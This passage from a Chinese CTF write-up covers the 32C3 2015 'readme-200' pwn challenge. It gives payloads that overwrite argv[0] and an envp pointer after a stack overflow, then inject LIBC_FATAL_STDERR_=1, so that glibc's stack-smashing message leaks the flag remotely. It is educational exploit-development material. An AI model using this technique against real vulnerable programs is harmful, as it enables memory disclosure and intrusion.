上图中画红线的两段都有可能是，都尝试一下，可以知道相差 536 字节，也就是第一条红线才是正确的。

简单方法：直接用 pwndbg>p &__libc_argv[0]

6. 尝试编写 payload:

```
#注释头
 
payload = ""
payload += "A"*0x218
payload += p64(flag_addr) #覆盖argv[0]

```

却发现没办法打印出来，连 *** stack smashing detected *** 都没办法接受到，那么肯定是远程的环境变量将 stderr 错误输出流设置为 0，只打印在远程本地。这里用 socat 搭建一下，可以验证出来，远程本地上能打印出来：

*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated

7. 那么如果想通过该方法获取远程打印的 flag，就需要将远程的环境变量 stderr 设置为 1，也就是 LIBC_FATAL_STDERR_=1。那么如何修改远程的环境变量呢，可以再通过 gdb 调试，输入 stack 100：

![](https://bbs.pediy.com/upload/attach/202108/904686_KK6YWKAHMHJEFBA.jpg)

这里的 536 就是所在 argv[0]，再看下下面的一些数据，552，556 都是环境变量，那么在远程肯定是需要调用的，这里选择修改 552 处的环境变量。那么之后又如何将 LIBC_FATAL_STDERR_=1 传过去呢？这里就想到程序有第二个输入，本来用来覆盖 0x600D20 的就可以被利用了。通过第二次输入将 LIBC_FATAL_STDERR_=1 传过去，保存在 0x600D20 前面部分，之后将 552 处的内容修改为 0x600D20，这样环境变量就被更改了。

8. 总 Payload:

```
#注释头
 
payload = ""
payload += "A"*0x218
payload += p64(0x400D20) #覆盖argv[0]
payload += p64(0)
payload += p64(0x600D20) #覆盖环境变量envp指针

```

9. 发送完 payload 后再发送 LIBC_FATAL_STDERR_=1 就可以将 flag 打印在本地了。

参考资料：

比较多，网上不太全，这个比较全

[https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)

[[注意] 招人！base 上海，课程运营、市场多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

[#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)